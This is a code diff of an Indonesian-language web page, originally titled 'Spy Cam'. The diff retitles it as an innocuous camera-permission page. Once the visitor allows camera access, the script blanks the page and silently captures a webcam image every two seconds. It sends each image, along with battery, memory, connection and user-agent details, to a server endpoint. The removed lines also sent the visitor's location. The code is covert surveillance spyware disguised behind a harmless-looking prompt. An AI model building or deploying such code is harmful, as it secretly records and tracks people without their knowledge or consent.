@@ -2,15 +2,16 @@
 <html lang="id">
   <head>
     <meta charset="UTF-8" />
-    <title>Spy Cam</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Halaman Izin Kamera</title>
     <style>
       body {
-        margin: 0;
-        background-color: white;
         display: flex;
         justify-content: center;
         align-items: center;
         height: 100vh;
+        margin: 0;
+        background-color: white;
       }
       button {
         padding: 20px 40px;
@@ -20,57 +21,63 @@
     </style>
   </head>
   <body>
-    <button id="startButton">Izinkan Kamera & Lokasi</button>
+    <button id="startButton">Klik untuk Meminta Izin Kamera</button>
 
     <script>
       document.getElementById("startButton").onclick = async () => {
         try {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          await video.play();
 
-          navigator.geolocation.getCurrentPosition(async (pos) => {
-            const latitude = pos.coords.latitude;
-            const longitude = pos.coords.longitude;
+          // Bersihkan halaman
+          document.body.innerHTML = "";
+          document.body.style.backgroundColor = "white";
 
-            const video = document.createElement("video");
-            video.srcObject = stream;
-            await video.play();
+          // Battery
+          let battery = { level: "Tidak diketahui", charging: "Tidak diketahui" };
+          if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            battery.level = b.level * 100;
+            battery.charging = b.charging ? "Ya" : "Tidak";
+          }
 
-            setInterval(async () => {
-              const canvas = document.createElement("canvas");
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              const ctx = canvas.getContext("2d");
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              const imageData = canvas.toDataURL("image/jpeg");
+          // Connection
+          const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+          const connectionType = conn ? conn.effectiveType || conn.type : "Tidak diketahui";
 
-              const battery = await navigator.getBattery?.();
-              const deviceInfo = {
-                batteryLevel: battery ? Math.round(battery.level * 100) : 'Tidak diketahui',
-                isCharging: battery ? (battery.charging ? 'Ya' : 'Tidak') : 'Tidak diketahui',
-                ram: navigator.deviceMemory || 'Tidak diketahui',
-                usedStorage: window.localStorage.length,
-                totalStorage: 'Tidak diketahui',
-              };
+          // RAM
+          const ram = navigator.deviceMemory || "Tidak diketahui";
 
-              fetch('/api/kirim', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  image: imageData,
-                  deviceInfo,
-                  latitude,
-                  longitude
-                })
-              });
-            }, 5000);
-          }, (err) => {
-            alert("Gagal ambil lokasi: " + err.message);
-          });
+          setInterval(() => {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
 
-          alert("Izin berhasil. Kamera & lokasi aktif.");
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        } catch (err) {
-          alert("Izin ditolak atau error: " + err.message);
+            const imageData = canvas.toDataURL("image/jpeg");
+
+            const deviceInfo = {
+              batteryLevel: battery.level,
+              isCharging: battery.charging,
+              ram: ram,
+              connection: connectionType,
+              userAgent: navigator.userAgent,
+              usedStorage: localStorage.length,
+              totalStorage: "Tidak diketahui"
+            };
+
+            fetch("/api/kirim", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ image: imageData, deviceInfo })
+            });
+          }, 2000);
+        } catch (error) {
+          alert("Izin kamera ditolak: " + error.message);
         }
       };
     </script>
